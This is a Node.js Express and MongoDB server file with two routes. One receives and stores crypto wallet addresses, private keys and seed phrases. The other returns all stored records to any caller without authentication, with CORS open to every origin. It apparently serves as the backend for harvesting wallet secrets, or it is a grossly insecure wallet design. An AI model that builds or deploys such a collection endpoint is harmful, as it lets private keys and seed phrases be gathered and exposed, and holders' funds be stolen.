const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const dotenv = require('dotenv');
const Wallet = require('./models/Wallet');

dotenv.config();

const app = express();
app.use(cors());
app.use(express.json());

// Connect to MongoDB
mongoose.connect(process.env.MONGO_URI, {
  useNewUrlParser: true,
  useUnifiedTopology: true
}).then(() => console.log("✅ Connected to MongoDB"))
  .catch((err) => console.error("❌ MongoDB error:", err));

// POST route to save wallet
app.post('/api/wallet', async (req, res) => {
  try {
    const { address, privateKey, mnemonic } = req.body;
    const newWallet = new Wallet({ address, privateKey, mnemonic });
    await newWallet.save();
    res.json({ message: 'Wallet saved successfully' });
  } catch (error) {
    res.status(500).json({ message: 'Error saving wallet' });
  }
});

// GET route to fetch all wallets
app.get('/api/wallets', async (req, res) => {
  const wallets = await Wallet.find();
  res.json(wallets);
});

const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
  console.log(`🚀 Server running on http://localhost:${PORT}`);
});
